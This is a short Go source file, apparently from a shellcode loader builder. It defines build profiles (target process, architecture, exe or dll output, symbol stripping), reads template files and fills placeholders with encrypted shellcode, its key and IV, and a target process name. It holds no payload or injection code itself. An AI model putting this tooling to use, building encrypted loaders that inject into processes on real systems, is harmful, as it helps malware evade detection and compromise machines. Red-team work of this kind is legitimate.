package core

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

type Profile struct {
	Name          string         `json:"name"`
	Author        string         `json:"author"`
	Template      string         `json:"template"`
	TargetProcess string         `json:"target_process"`
	Arch          string         `json:"arch"`
	Compile       CompileOptions `json:"compile"`
	OutputDir     string         `json:"output_dir"`
	Filename      string         `json:"filename"`
}

type CompileOptions struct {
	Automatic  bool     `json:"automatic"`
	Compiler   string   `json:"compiler"`
	Strip      bool     `json:"strip"`
	OutputType string   `json:"output_type"` // "exe" (default) or "dll"
	Args       []string `json:"args,omitempty"`
}

func LoadTemplate(templateDir, templateName, filename string) (string, error) {
	path := filepath.Join(templateDir, templateName, filename)
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("reading template %q: %w", path, err)
	}
	return string(data), nil
}

func SubstitutePlaceholders(tmpl string, payload *EncryptedPayload, profile *Profile) string {
	r := strings.NewReplacer(
		"${SHELLCODE}", FormatByteArray(payload.Ciphertext),
		"${KEY}", FormatByteArray(payload.Key),
		"${IV}", FormatByteArray(payload.IV),
		"${TARGET_PROCESS}", strings.ReplaceAll(profile.TargetProcess, `\`, `\\`),
	)
	return r.Replace(tmpl)
}
